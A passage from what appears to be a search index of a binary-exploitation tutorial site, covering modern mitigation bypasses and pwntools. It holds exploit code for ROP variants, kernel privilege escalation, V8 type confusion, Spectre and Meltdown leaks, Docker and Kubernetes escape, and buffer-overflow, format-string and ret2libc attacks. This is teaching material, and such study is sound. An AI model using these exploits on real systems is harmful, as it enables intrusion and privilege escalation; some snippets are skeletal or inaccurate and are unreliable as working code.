<li>Control allocation patterns: Manipulate heap layout through allocation/free sequences</li> <li>Exploit metadata corruption: Target chunk headers and bin structures</li> <li>Chain primitives: Combine heap vulnerabilities with other techniques</li> <li>Adapt to mitigations: Modern heaps have extensive protections that require sophisticated bypasses</li> <li>Practice with CTF challenges: Build intuition through hands-on exploitation</li> </ol> <p>Heap exploitation requires deep understanding of memory allocator internals and careful manipulation of heap state to achieve reliable code execution.</p>"},{"location":"binary-exploitation/advanced/03-modern/","title":"Modern Exploitation Techniques","text":"<p>Modern exploitation has evolved significantly due to advanced security mitigations. This section covers cutting-edge techniques used to bypass contemporary protections and achieve reliable exploitation.</p>"},{"location":"binary-exploitation/advanced/03-modern/#modern-mitigations-landscape","title":"Modern Mitigations Landscape","text":""},{"location":"binary-exploitation/advanced/03-modern/#hardware-based-protections","title":"Hardware-Based Protections","text":"<p>Intel CET (Control-flow Enforcement Technology) - Shadow Stack: Hardware-backed return address protection - Indirect Branch Tracking: Validates indirect calls/jumps</p> <p>ARM Pointer Authentication <pre><code>// ARM64 pointer authentication\nvoid *authenticated_ptr = __builtin_arm_auth_pointer(ptr, key);\n</code></pre></p> <p>Intel MPX (Memory Protection Extensions) - Hardware bounds checking for pointers - Deprecated in newer processors</p>"},{"location":"binary-exploitation/advanced/03-modern/#software-mitigations","title":"Software Mitigations","text":"<p>CFI (Control Flow Integrity) <pre><code>// Clang CFI example\n__attribute__((cfi_canonical_jump_table))\nvoid function_with_cfi() {\n    // Protected against ROP/JOP\n}\n</code></pre></p> <p>Stack Clash Protection - Prevents stack/heap collision attacks - Probes stack growth to detect manipulation</p>"},{"location":"binary-exploitation/advanced/03-modern/#advanced-rop-techniques","title":"Advanced ROP Techniques","text":""},{"location":"binary-exploitation/advanced/03-modern/#jop-jump-oriented-programming","title":"JOP (Jump-Oriented Programming)","text":"<p>Uses indirect jumps instead of returns for control flow.</p> <pre><code># JOP chain construction\ndef build_jop_chain():\n    # Find gadgets ending in indirect jumps\n    gadget1 = 0x401234  # pop rdi; jmp [rax]\n    gadget2 = 0x401567  # pop rsi; jmp [rbx]\n\n    chain = [\n        gadget1,\n        p64(arg1),      # rdi value\n        gadget2,\n        p64(arg2),      # rsi value\n        # ... continue chain\n    ]\n    return chain\n</code></pre>"},{"location":"binary-exploitation/advanced/03-modern/#srop-sigreturn-oriented-programming","title":"SROP (Sigreturn-Oriented Programming)","text":"<p>Exploits <code>sigreturn</code> syscall to control all registers.</p> <pre><code>def srop_exploit():\n    # Build sigreturn frame\n    frame = SigreturnFrame()\n    frame.rax = 59         # execve syscall\n    frame.rdi = binsh_addr # \"/bin/sh\" address\n    frame.rsi = 0          # argv\n    frame.rdx = 0          # envp\n    frame.rip = syscall_gadget\n\n    payload = b\"A\" * offset\n    payload += p64(sigreturn_gadget)\n    payload += bytes(frame)\n\n    return payload\n</code></pre>"},{"location":"binary-exploitation/advanced/03-modern/#stack-pivoting","title":"Stack Pivoting","text":"<p>Moves stack pointer to controlled memory region.</p> <pre><code>def stack_pivot():\n    # Find stack pivot gadget\n    pivot_gadget = 0x401890  # mov rsp, rdi; ret\n\n    payload = b\"A\" * offset\n    payload += p64(pop_rdi_ret)\n    payload += p64(fake_stack_addr)\n    payload += p64(pivot_gadget)\n\n    return payload\n</code></pre>"},{"location":"binary-exploitation/advanced/03-modern/#kernel-exploitation","title":"Kernel Exploitation","text":""},{"location":"binary-exploitation/advanced/03-modern/#ret2usr","title":"ret2usr","text":"<p>Returns from kernel space to user space to execute shellcode.</p> <pre><code>// Kernel vulnerability example\nstatic long device_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {\n    char buffer[256];\n    if (copy_from_user(buffer, (void *)arg, 1024)) {  // Buffer overflow!\n        return -EFAULT;\n    }\n    return 0;\n}\n</code></pre> <pre><code># ret2usr exploitation\ndef ret2usr_exploit():\n    # 1. Map executable page in userland\n    shellcode_addr = mmap(0x1337000, 0x1000, \n                          PROT_READ | PROT_WRITE | PROT_EXEC,\n                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)\n\n    # 2. Write privilege escalation shellcode\n    shellcode = asm(\"\"\"\n        /* Disable SMEP if enabled */\n        mov rax, cr4\n        and rax, ~(1 &lt;&lt; 20)\n        mov cr4, rax\n\n        /* Escalate privileges */\n        mov rdi, 0\n        call prepare_kernel_cred\n        mov rdi, rax\n        call commit_creds\n\n        /* Return to userland */\n        swapgs\n        mov rax, 0x1337000\n        iretq\n    \"\"\")\n\n    # 3. Trigger kernel vulnerability\n    payload = b\"A\" * offset + p64(shellcode_addr)\n    trigger_vuln(payload)\n</code></pre>"},{"location":"binary-exploitation/advanced/03-modern/#kaslr-bypass","title":"KASLR Bypass","text":"<pre><code>def bypass_kaslr():\n    # Method 1: Information leak\n    kernel_text_leak = leak_kernel_address()\n    kernel_base = kernel_text_leak &amp; ~0xfff\n\n    # Method 2: Prefetch side-channel\n    def timing_attack():\n        for candidate in range(0xffffffff80000000, 0xffffffffc0000000, 0x100000):\n            start = time.time()\n            try:\n                # Attempt to access potential kernel address\n                access_memory(candidate)\n            except:\n                pass\n            timing = time.time() - start\n\n            if timing &lt; threshold:  # Fast access = valid mapping\n                return candidate\n\n    return kernel_base\n</code></pre>"},{"location":"binary-exploitation/advanced/03-modern/#browser-exploitation","title":"Browser Exploitation","text":""},{"location":"binary-exploitation/advanced/03-modern/#v8-engine-exploitation","title":"V8 Engine Exploitation","text":"<pre><code>// Type confusion example\nlet oob_array = [1.1, 2.2, 3.3];\nlet obj_array = [{}, {}, {}];\n\n// Trigger type confusion through optimization\nfunction type_confuse(flag) {\n    let a = flag ? oob_array : obj_array;\n    return a[0];\n}\n\n// Force optimization\nfor (let i = 0; i &lt; 100000; i++) {\n    type_confuse(true);\n}\n\n// Trigger type confusion\nlet confused = type_confuse(false);\n</code></pre>"},{"location":"binary-exploitation/advanced/03-modern/#jit-spray","title":"JIT Spray","text":"<pre><code>// JIT spray technique\nfunction jit_spray() {\n    // Craft shellcode in constants\n    let shellcode = 0x90909090;  // NOP sled\n\n    function spray_func() {\n        // Force JIT compilation with shellcode constants\n        return shellcode + shellcode + shellcode;\n    }\n\n    // Trigger JIT compilation\n    for (let i = 0; i &lt; 100000; i++) {\n        spray_func();\n    }\n\n    // Find JIT code page and execute\n    execute_jit_code();\n}\n</code></pre>"},{"location":"binary-exploitation/advanced/03-modern/#side-channel-attacks","title":"Side-Channel Attacks","text":""},{"location":"binary-exploitation/advanced/03-modern/#spectre-exploitation","title":"Spectre Exploitation","text":"<pre><code>// Spectre variant 1 example\nunsigned char array1[16];\nunsigned char array2[256 * 512];\nunsigned char temp;\nunsigned int array1_size = 16;\n\nvoid spectre_attack(size_t x) {\n    if (x &lt; array1_size) {  // Bounds check\n        // Speculative execution may bypass this check\n        temp &amp;= array2[array1[x] * 512];\n    }\n}\n\n// Measure timing to extract data\nvoid extract_byte(size_t malicious_x) {\n    // Train branch predictor\n    for (int i = 0; i &lt; 5; i++) {\n        spectre_attack(i);\n    }\n\n    // Flush cache\n    for (int i = 0; i &lt; 256; i++) {\n        _mm_clflush(&amp;array2[i * 512]);\n    }\n\n    // Attack with out-of-bounds index\n    spectre_attack(malicious_x);\n\n    // Time memory accesses to determine leaked byte\n    for (int i = 0; i &lt; 256; i++) {\n        int junk = 0;\n        register uint64_t time1 = __rdtscp(&amp;junk);\n        junk = array2[i * 512];\n        register uint64_t time2 = __rdtscp(&amp;junk);\n\n        if ((time2 - time1) &lt; CACHE_HIT_THRESHOLD) {\n            printf(\"Leaked byte: %02x\\n\", i);\n        }\n    }\n}\n</code></pre>"},{"location":"binary-exploitation/advanced/03-modern/#meltdown-exploitation","title":"Meltdown Exploitation","text":"<pre><code>// Meltdown example\nvoid meltdown_attack(void *kernel_addr) {\n    char *probe_array = mmap(NULL, 256 * 4096, PROT_READ | PROT_WRITE,\n                             MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n\n    // Flush probe array from cache\n    for (int i = 0; i &lt; 256; i++) {\n        _mm_clflush(&amp;probe_array[i * 4096]);\n    }\n\n    // Speculative execution reads kernel memory\n    register char kernel_data = *(char *)kernel_addr;\n\n    // Encode leaked data in cache state\n    probe_array[kernel_data * 4096] = 1;\n\n    // Measure cache timings to extract data\n    for (int i = 0; i &lt; 256; i++) {\n        uint64_t start = __rdtsc();\n        volatile char dummy = probe_array[i * 4096];\n        uint64_t end = __rdtsc();\n\n        if ((end - start) &lt; CACHE_THRESHOLD) {\n            printf(\"Kernel byte: %02x\\n\", i);\n            break;\n        }\n    }\n}\n</code></pre>"},{"location":"binary-exploitation/advanced/03-modern/#exploit-automation","title":"Exploit Automation","text":""},{"location":"binary-exploitation/advanced/03-modern/#automatic-exploit-generation","title":"Automatic Exploit Generation","text":"<pre><code># Symbolic execution for exploit generation\nimport angr\nimport claripy\n\ndef auto_exploit_generation(binary_path):\n    # Load binary\n    project = angr.Project(binary_path)\n\n    # Create symbolic input\n    flag = claripy.BVS('flag', 8 * 32)  # 32-byte flag\n\n    # Set up simulation manager\n    simgr = project.factory.simulation_manager()\n\n    # Find path to win condition\n    simgr.explore(find=win_address, avoid=lose_address)\n\n    if simgr.found:\n        solution_state = simgr.found[0]\n        return solution_state.solver.eval(flag, cast_to=bytes)\n\n    return None\n</code></pre>"},{"location":"binary-exploitation/advanced/03-modern/#ml-assisted-exploitation","title":"ML-Assisted Exploitation","text":"<pre><code># Neural network for gadget classification\nimport tensorflow as tf\n\ndef train_gadget_classifier():\n    model = tf.keras.Sequential([\n        tf.keras.layers.Dense(128, activation='relu'),\n        tf.keras.layers.Dense(64, activation='relu'),\n        tf.keras.layers.Dense(1, activation='sigmoid')\n    ])\n\n    # Train on gadget features\n    model.compile(optimizer='adam', \n                  loss='binary_crossentropy',\n                  metrics=['accuracy'])\n\n    return model\n\ndef find_gadgets_with_ml(binary_data):\n    model = load_trained_model()\n    features = extract_features(binary_data)\n    predictions = model.predict(features)\n\n    return [addr for addr, pred in zip(addresses, predictions) if pred &gt; 0.8]\n</code></pre>"},{"location":"binary-exploitation/advanced/03-modern/#containerized-exploitation","title":"Containerized Exploitation","text":""},{"location":"binary-exploitation/advanced/03-modern/#docker-escape","title":"Docker Escape","text":"<pre><code># Container escape through privileged container\ndocker run --privileged -it ubuntu:latest /bin/bash\n\n# Mount host filesystem\nmkdir /mnt/host\nmount /dev/sda1 /mnt/host\n\n# Access host files\nchroot /mnt/host /bin/bash\n</code></pre>"},{"location":"binary-exploitation/advanced/03-modern/#kubernetes-exploitation","title":"Kubernetes Exploitation","text":"<pre><code># Malicious pod with host access\napiVersion: v1\nkind: Pod\nmetadata:\n  name: evil-pod\nspec:\n  hostNetwork: true\n  hostPID: true\n  containers:\n  - name: evil-container\n    image: alpine\n    securityContext:\n      privileged: true\n    volumeMounts:\n    - name: host-root\n      mountPath: /host\n  volumes:\n  - name: host-root\n    hostPath:\n      path: /\n</code></pre>"},{"location":"binary-exploitation/advanced/03-modern/#iot-and-embedded-exploitation","title":"IoT and Embedded Exploitation","text":""},{"location":"binary-exploitation/advanced/03-modern/#firmware-analysis","title":"Firmware Analysis","text":"<pre><code># Automated firmware extraction and analysis\ndef analyze_firmware(firmware_path):\n    # Extract filesystem\n    os.system(f\"binwalk -e {firmware_path}\")\n\n    # Find UART/debug interfaces\n    uart_strings = [\"console\", \"debug\", \"shell\", \"login\"]\n\n    # Analyze for hardcoded credentials\n    credentials = find_credentials(firmware_path)\n\n    # Check for known vulnerabilities\n    vulns = scan_vulnerabilities(firmware_path)\n\n    return {\n        'credentials': credentials,\n        'vulnerabilities': vulns,\n        'debug_interfaces': uart_strings\n    }\n</code></pre>"},{"location":"binary-exploitation/advanced/03-modern/#key-takeaways","title":"Key Takeaways","text":"<ol> <li>Adapt to modern mitigations: Traditional techniques often require sophisticated bypasses</li> <li>Combine multiple primitives: Modern exploits chain various vulnerabilities and techniques</li> <li>Leverage side-channels: Hardware vulnerabilities provide new attack vectors</li> <li>Automate discovery: Use tools like symbolic execution and ML for exploit development</li> <li>Understand target architecture: Different platforms require specialized techniques</li> <li>Stay current: The security landscape evolves rapidly with new mitigations and bypasses</li> <li>Think beyond traditional exploitation: Consider supply chain, cloud, and IoT attack vectors</li> </ol> <p>Modern exploitation requires a deep understanding of both hardware and software security mechanisms, as well as the creativity to chain multiple techniques for reliable exploitation.</p>"},{"location":"binary-exploitation/fundamentals/01-pwntools/","title":"Introduction to pwntools","text":"<p>Pwntools is a CTF framework and exploit development library designed to make writing exploits simple and fast. It's an essential tool for binary exploitation and reverse engineering.</p>"},{"location":"binary-exploitation/fundamentals/01-pwntools/#installation-and-setup","title":"Installation and Setup","text":""},{"location":"binary-exploitation/fundamentals/01-pwntools/#installing-pwntools","title":"Installing pwntools","text":"<pre><code># Ubuntu/Debian\nsudo apt update\nsudo apt install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential\npython3 -m pip install --upgrade pip\npython3 -m pip install --upgrade pwntools\n\n# Verify installation\npython3 -c \"import pwn; print(pwn.__version__)\"\n</code></pre>"},{"location":"binary-exploitation/fundamentals/01-pwntools/#basic-configuration","title":"Basic Configuration","text":"<pre><code># ~/.pwntools.conf\n[context]\narch = amd64\nos = linux\nlog_level = info\n\n[template]\nhost = localhost\nport = 1337\n</code></pre>"},{"location":"binary-exploitation/fundamentals/01-pwntools/#core-concepts","title":"Core Concepts","text":""},{"location":"binary-exploitation/fundamentals/01-pwntools/#context-management","title":"Context Management","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\n# Set global context\ncontext.arch = 'amd64'\ncontext.os = 'linux'\ncontext.log_level = 'debug'\n\n# Or use context manager\nwith context.local(arch='i386'):\n    # 32-bit operations here\n    shellcode = asm('mov eax, 1')\n\nprint(f\"Architecture: {context.arch}\")\nprint(f\"Endianness: {context.endianness}\")\nprint(f\"Word size: {context.word_size}\")\n</code></pre>"},{"location":"binary-exploitation/fundamentals/01-pwntools/#process-interaction","title":"Process Interaction","text":"<pre><code>from pwn import *\n\n# Local process\np = process('./vulnerable_program')\n\n# Remote connection\nr = remote('target.com', 1337)\n\n# SSH connection\ns = ssh('user', 'host', password='pass')\np = s.process('./program')\n\n# Basic I/O\np.sendline(b'Hello, World!')\nresponse = p.recvline()\np.interactive()  # Drop to interactive mode\n</code></pre>"},{"location":"binary-exploitation/fundamentals/01-pwntools/#basic-exploitation-example","title":"Basic Exploitation Example","text":""},{"location":"binary-exploitation/fundamentals/01-pwntools/#vulnerable-program","title":"Vulnerable Program","text":"<pre><code>// vuln.c\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nvoid win() {\n    printf(\"You win!\\n\");\n    system(\"/bin/sh\");\n}\n\nvoid vulnerable() {\n    char buffer[64];\n    printf(\"Enter input: \");\n    gets(buffer);  // Vulnerable function\n    printf(\"You entered: %s\\n\", buffer);\n}\n\nint main() {\n    vulnerable();\n    return 0;\n}\n</code></pre> <p>Compilation: <pre><code># Compile with specific protections disabled\ngcc -fno-stack-protector -no-pie -o vuln vuln.c\n\n# Check security features\nchecksec vuln\n</code></pre></p>"},{"location":"binary-exploitation/fundamentals/01-pwntools/#basic-buffer-overflow-exploit","title":"Basic Buffer Overflow Exploit","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\n# Set up context\ncontext.binary = './vuln'\ncontext.log_level = 'debug'\n\ndef exploit():\n    # Start the process\n    p = process('./vuln')\n\n    # Find the win function address\n    elf = ELF('./vuln')\n    win_addr = elf.symbols['win']\n\n    # Create payload\n    offset = 72  # Offset to return address\n    payload = b'A' * offset\n    payload += p64(win_addr)  # Overwrite return address\n\n    # Send payload\n    p.sendline(payload)\n\n    # Get shell\n    p.interactive()\n\nif __name__ == '__main__':\n    exploit()\n</code></pre>"},{"location":"binary-exploitation/fundamentals/01-pwntools/#core-pwntools-modules","title":"Core pwntools Modules","text":""},{"location":"binary-exploitation/fundamentals/01-pwntools/#elf-module","title":"ELF Module","text":"<pre><code>from pwn import *\n\n# Load binary\nelf = ELF('./program')\n\n# Get function addresses\nmain_addr = elf.symbols['main']\nprintf_addr = elf.plt['printf']  # PLT entry\nprintf_got = elf.got['printf']   # GOT entry\n\n# Get section information\ntext_section = elf.get_section_by_name('.text')\nprint(f\"Text section: {hex(text_section.header.sh_addr)}\")\n\n# Find strings\nstrings = elf.search(b'/bin/sh')\nfor addr in strings:\n    print(f\"Found '/bin/sh' at: {hex(addr)}\")\n\n# Find gadgets (requires ROPgadget)\nrop = ROP(elf)\npop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]\n\n# Check security features\nprint(f\"NX: {elf.nx}\")\nprint(f\"PIE: {elf.pie}\")\nprint(f\"Canary: {elf.canary}\")\n</code></pre>"},{"location":"binary-exploitation/fundamentals/01-pwntools/#rop-return-oriented-programming","title":"ROP (Return Oriented Programming)","text":"<pre><code>from pwn import *\n\ncontext.arch = 'amd64'\nelf = ELF('./program')\nrop = ROP(elf)\n\n# Build ROP chain\nrop.call('puts', [elf.got['puts']])\nrop.call(elf.symbols['main'])\n\nprint(rop.dump())\npayload = b'A' * 72 + rop.chain()\n</code></pre>"},{"location":"binary-exploitation/fundamentals/01-pwntools/#shellcode-generation","title":"Shellcode Generation","text":"<pre><code>from pwn import *\n\n# Generate shellcode for different architectures\ncontext.arch = 'amd64'\nshellcode = asm(shellcraft.sh())\n\n# Or manually\nshellcode = asm('''\n    mov rax, 59        /* sys_execve */\n    lea rdi, [rip + binsh]\n    xor rsi, rsi\n    xor rdx, rdx\n    syscall\n\n    binsh:\n    .ascii \"/bin/sh\\\\x00\"\n''')\n\n# Alphanumeric shellcode\nalpha_shellcode = asm(shellcraft.sh(), arch='i386')\nencoded = encode(alpha_shellcode, 'alpha_mixed')\n</code></pre>"},{"location":"binary-exploitation/fundamentals/01-pwntools/#format-string-exploitation","title":"Format String Exploitation","text":"<pre><code>from pwn import *\n\n# Vulnerable program that uses printf(user_input)\np = process('./format_vuln')\n\n# Find format string offset\ndef find_offset():\n    for i in range(1, 20):\n        p = process('./format_vuln')\n        payload = f\"AAAA%{i}$x\".encode()\n        p.sendline(payload)\n        response = p.recvline()\n        if b'41414141' in response:\n            print(f\"Offset found: {i}\")\n            return i\n        p.close()\n\noffset = find_offset()\n\n# Leak stack values\ndef leak_stack(offset, count=10):\n    payload = \"\"\n    for i in range(count):\n        payload += f\"%{offset + i}$lx \"\n\n    p.sendline(payload.encode())\n    response = p.recvline().decode()\n    values = response.split()\n\n    for i, val in enumerate(values):\n        try:\n            addr = int(val, 16)\n            print(f\"Stack[{offset + i}]: 0x{addr:016x}\")\n        except ValueError:\n            continue\n\nleak_stack(offset)\n</code></pre>"},{"location":"binary-exploitation/fundamentals/01-pwntools/#advanced-features","title":"Advanced Features","text":""},{"location":"binary-exploitation/fundamentals/01-pwntools/#automatic-exploitation","title":"Automatic Exploitation","text":"<pre><code>from pwn import *\n\n# Automatic buffer overflow detection\ndef auto_exploit():\n    elf = ELF('./vuln')\n    p = process('./vuln')\n\n    # Create cyclic pattern\n    pattern = cyclic(200)\n    p.sendline(pattern)\n\n    # Wait for crash\n    p.wait()\n\n    # Get core dump info\n    core = Coredump('./core')\n    offset = cyclic_find(core.read(core.rsp, 4))\n\n    print(f\"Offset found: {offset}\")\n\n    # Build exploit\n    payload = b'A' * offset\n    payload += p64(elf.symbols['win'])\n\n    # Test exploit\n    p = process('./vuln')\n    p.sendline(payload)\n    p.interactive()\n</code></pre>"},{"location":"binary-exploitation/fundamentals/01-pwntools/#remote-exploitation","title":"Remote Exploitation","text":"<pre><code>from pwn import *\n\ndef remote_exploit():\n    # Connect to remote service\n    r = remote('target.example.com', 1337)\n\n    # Handle banner/menu\n    r.recvuntil(b'Enter choice: ')\n    r.sendline(b'1')  # Select vulnerable option\n\n    # Send exploit payload\n    payload = build_payload()\n    r.sendline(payload)\n\n    # Get shell\n    r.interactive()\n\ndef build_payload():\n    # Payload construction logic\n    offset = 72\n    rop_chain = build_rop_chain()\n\n    payload = b'A' * offset\n    payload += rop_chain\n\n    return payload\n</code></pre>"},{"location":"binary-exploitation/fundamentals/01-pwntools/#template-generation","title":"Template Generation","text":"<pre><code>#!/usr/bin/env python3\n# Generated with pwn template\nfrom pwn import *\n\nexe = context.binary = ELF('./challenge')\nhost = args.HOST or 'localhost'\nport = int(args.PORT or 1337)\n\ndef start_local(argv=[], *a, **kw):\n    '''Execute the target binary locally'''\n    if args.GDB:\n        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)\n    else:\n        return process([exe.path] + argv, *a, **kw)\n\ndef start_remote(argv=[], *a, **kw):\n    '''Connect to the process on the remote host'''\n    io = connect(host, port)\n    if args.GDB:\n        gdb.attach(io, gdbscript=gdbscript)\n    return io\n\ndef start(argv=[], *a, **kw):\n    '''Start the exploit against the target'''\n    if args.LOCAL:\n        return start_local(argv, *a, **kw)\n    else:\n        return start_remote(argv, *a, **kw)\n\ngdbscript = '''\ntbreak main\ncontinue\n'''.format(**locals())\n\n# Exploit code goes here\nio = start()\n\n# Example payload\npayload = flat({\n    72: exe.symbols['win']\n})\n\nio.sendline(payload)\nio.interactive()\n</code></pre>"},{"location":"binary-exploitation/fundamentals/01-pwntools/#utility-functions","title":"Utility Functions","text":""},{"location":"binary-exploitation/fundamentals/01-pwntools/#pattern-generation-and-analysis","title":"Pattern Generation and Analysis","text":"<pre><code>from pwn import *\n\n# Generate cyclic pattern\npattern = cyclic(100)\nprint(pattern)\n\n# Find offset from crash\ncrash_value = 0x61616a61  # Example crash value\noffset = cyclic_find(crash_value)\nprint(f\"Offset: {offset}\")\n\n# De Bruijn sequence for unique patterns\npattern = de_bruijn(4, 100)  # 4-byte alphabet, 100 chars\n</code></pre>"},{"location":"binary-exploitation/fundamentals/01-pwntools/#payload-construction","title":"Payload Construction","text":"<pre><code>from pwn import *\n\n# Flat payload construction\npayload = flat([\n    b'A' * 64,          # Padding\n    0xdeadbeef,          # Return address\n    0x41414141,          # RDI\n    0x42424242,          # RSI\n])\n\n# Fit payload to specific size\npayload = fit({\n    0: b'start',\n    64: p64(0xdeadbeef),\n    72: b'end'\n}, length=100)\n\n# Pack/unpack integers\npacked = p64(0x1122334455667788)\nunpacked = u64(packed)\n</code></pre>"},{"location":"binary-exploitation/fundamentals/01-pwntools/#encoding-and-encryption","title":"Encoding and Encryption","text":"<pre><code>from pwn import *\n\n# XOR encoding\ndata = b\"secret\"\nkey = b\"key\"\nencoded = xor(data, key)\ndecoded = xor(encoded, key)\n\n# Base64\nimport base64\nb64_encoded = base64.b64encode(data)\nb64_decoded = base64.b64decode(b64_encoded)\n\n# URL encoding\nfrom urllib.parse import quote, unquote\nurl_encoded = quote(data)\nurl_decoded = unquote(url_encoded).encode()\n</code></pre>"},{"location":"binary-exploitation/fundamentals/01-pwntools/#debugging-integration","title":"Debugging Integration","text":""},{"location":"binary-exploitation/fundamentals/01-pwntools/#gdb-integration","title":"GDB Integration","text":"<pre><code>from pwn import *\n\ncontext.terminal = ['tmux', 'splitw', '-h']\n\n# Attach GDB to running process\np = process('./vuln')\ngdb.attach(p, '''\n    break main\n    break vulnerable\n    continue\n''')\n\n# Or start with GDB\np = gdb.debug('./vuln', '''\n    set disassembly-flavor intel\n    break *main+42\n    run\n''')\n</code></pre>"},{"location":"binary-exploitation/fundamentals/01-pwntools/#logging-and-output","title":"Logging and Output","text":"<pre><code>from pwn import *\n\n# Different log levels\ncontext.log_level = 'debug'    # Most verbose\ncontext.log_level = 'info'     # Default\ncontext.log_level = 'warn'     # Warnings only\ncontext.log_level = 'error'    # Errors only\n\n# Custom logging\nlog.info(\"Starting exploit\")\nlog.success(\"Got shell!\")\nlog.warning(\"Unusual response\")\nlog.error(\"Exploit failed\")\n\n# Progress indicator\np = log.progress(\"Brute forcing\")\nfor i in range(100):\n    p.status(f\"Trying {i}\")\n    time.sleep(0.1)\np.success(\"Found!\")\n</code></pre>"},{"location":"binary-exploitation/fundamentals/01-pwntools/#common-patterns-and-techniques","title":"Common Patterns and Techniques","text":""},{"location":"binary-exploitation/fundamentals/01-pwntools/#information-leaks","title":"Information Leaks","text":"<pre><code>def leak_address(p, format_offset):\n    \"\"\"Leak address using format string\"\"\"\n    payload = f\"%{format_offset}$lx\".encode()\n    p.sendline(payload)\n    response = p.recvline()\n    leaked = int(response.strip(), 16)\n    return leaked\n\ndef leak_canary(p):\n    \"\"\"Leak stack canary\"\"\"\n    # Send payload that triggers canary check\n    payload = b'A' * 264  # Overwrite canary\n    p.sendline(payload)\n    response = p.recvall()\n\n    if b\"stack smashing detected\" in response:\n        log.info(\"Canary detected\")\n        # Use format string to leak canary\n        return leak_canary_format_string(p)\n</code></pre>"},{"location":"binary-exploitation/fundamentals/01-pwntools/#return-to-libc","title":"Return-to-libc","text":"<pre><code>def ret2libc_exploit():\n    elf = ELF('./vuln')\n    libc = ELF('./libc.so.6')\n    p = process('./vuln')\n\n    # Leak libc address\n    payload1 = flat([\n        b'A' * 72,\n        elf.plt['puts'],\n        elf.symbols['main'],\n        elf.got['puts']\n    ])\n\n    p.sendline(payload1)\n    leaked_puts = u64(p.recvline()[:6].ljust(8, b'\\x00'))\n    libc.address = leaked_puts - libc.symbols['puts']\n\n    log.info(f\"Libc base: {hex(libc.address)}\")\n\n    # Execute system(\"/bin/sh\")\n    payload2 = flat([\n        b'A' * 72,\n        libc.symbols['system'],\n        libc.search(b'/bin/sh').__next__()\n    ])\n\n    p.sendline(payload2)\n    p.interactive()\n</code></pre>"},{"location":"binary-exploitation/fundamentals/01-pwntools/#best-practices","title":"Best Practices","text":""},{"location":"binary-exploitation/fundamentals/01-pwntools/#script-organization","title":"Script Organization","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\n# Global settings\ncontext.arch = 'amd64'\ncontext.log_level = 'info'\n\n# Constants\nBINARY_PATH = './challenge'\nLIBC_PATH = './libc.so.6'\n\nclass Exploit:\n    def __init__(self, local=True):\n        self.local = local\n        self.elf = ELF(BINARY_PATH)\n        self.libc = ELF(LIBC_PATH) if os.path.exists(LIBC_PATH) else None\n\n    def start(self):\n        if self.local:\n            return process(BINARY_PATH)\n        else:\n            return remote('target.com', 1337)\n\n    def find_offset(self):\n        # Implementation here\n        pass\n\n    def leak_addresses(self, p):\n        # Implementation here\n        pass\n\n    def build_payload(self):\n        # Implementation here\n        pass\n\n    def run(self):\n        p = self.start()\n        payload = self.build_payload()\n        p.sendline(payload)\n        p.interactive()\n\nif __name__ == '__main__':\n    exploit = Exploit(local=args.LOCAL)\n    exploit.run()\n</code></pre>"},{"location":"binary-exploitation/fundamentals/01-pwntools/#error-handling","title":"Error Handling","text":"<pre><code>def robust_exploit():\n    max_attempts = 5\n\n    for attempt in range(max_attempts):\n        try:\n            p = remote('target.com', 1337)\n\n            # Send payload\n            payload = build_payload()\n            p.sendline(payload)\n\n            # Check if exploit worked\n            response = p.recv(timeout=2)\n            if b\"shell\" in response or b\"$\" in response:\n                log.success(\"Exploit successful!\")\n                p.interactive()\n                return\n\n        except Exception as e:\n            log.warning(f\"Attempt {attempt + 1} failed: {e}\")\n            if p:\n                p.close()\n\n        time.sleep(1)  # Brief delay between attempts\n\n    log.error(\"All attempts failed\")\n</code></pre>"},{"location":"binary-exploitation/fundamentals/01-pwntools/#key-takeaways","title":"Key Takeaways","text":"<p>pwntools Fundamentals</p> <ul> <li>Context management is crucial for correct operation</li> <li>ELF module provides powerful binary analysis capabilities</li> <li>Process interaction enables both local and remote exploitation</li> <li>ROP chains can be built automatically or manually</li> <li>Logging system helps debug and track exploit progress</li> </ul> <p>Exploitation Workflow</p> <ul> <li>Start with template generation for consistent structure</li> <li>Use cyclic patterns to find buffer overflow offsets</li> <li>Leverage automatic gadget finding for ROP chains</li> <li>Test locally before attempting remote exploitation</li> <li>Implement robust error handling for unreliable connections</li> </ul> <p>Common Issues</p> <ul> <li>Architecture mismatches can cause incorrect addresses</li> <li>Endianness problems with packed integers</li> <li>Timeout issues with slow or unreliable connections</li> <li>Version differences between local and remote libc</li> <li>ASLR affecting address calculations</li> </ul> <p>Next: Buffer Overflows</p>"},{"location":"binary-exploitation/fundamentals/02-buffer-overflow/","title":"Buffer Overflows","text":"<p>Buffer overflows are one of the most common and fundamental vulnerabilities in software. They occur when a program writes more data to a buffer than it was designed to hold, potentially overwriting adjacent memory.</p>"},{"location":"binary-exploitation/fundamentals/02-buffer-overflow/#understanding-buffer-overflows","title":"Understanding Buffer Overflows","text":""},{"location":"binary-exploitation/fundamentals/02-buffer-overflow/#what-is-a-buffer-overflow","title":"What is a Buffer Overflow?","text":"<p>A buffer overflow occurs when: 1. Input exceeds buffer size - More data is written than allocated 2. No bounds checking - Program doesn't validate input length 3. Adjacent memory overwritten - Critical data gets corrupted 4. Control flow hijacked - Return addresses or function pointers modified</p>"},{"location":"binary-exploitation/fundamentals/02-buffer-overflow/#memory-layout-review","title":"Memory Layout Review","text":"<pre><code>Stack Frame Layout:\nHigh Address\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502   Function Args     \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502   Return Address    \u2502 \u2190 Target for overflow\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502   Saved Frame Ptr   